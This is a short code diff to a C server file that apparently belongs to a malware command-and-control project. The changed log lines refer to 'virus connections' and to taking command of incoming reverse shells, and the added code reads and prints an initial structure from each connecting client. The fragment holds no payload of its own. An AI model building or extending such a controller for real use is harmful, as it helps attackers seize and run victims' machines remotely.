@@ -21,11 +21,16 @@
 #include "utils.h"
 #include "networking.h"
 #include "server.h"
+#include "init_struct.h"
 
 #define SIZE 100
 
 int listening_server_action(int new_socket){
-  printf("Listening child listening for incoming virus connections...\n");
+  printf("ready to take command of the new reverse shell that just connected...\n");
+  struct init_struct init;
+  read(new_socket, &init, sizeof(struct  init_struct));
+  printf("RECIEVED CONNECTION!...\n");
+  print_init_struct(&init);
 
   int * childFds = (int*)malloc(SIZE * sizeof(int));
   int idCount = 0;
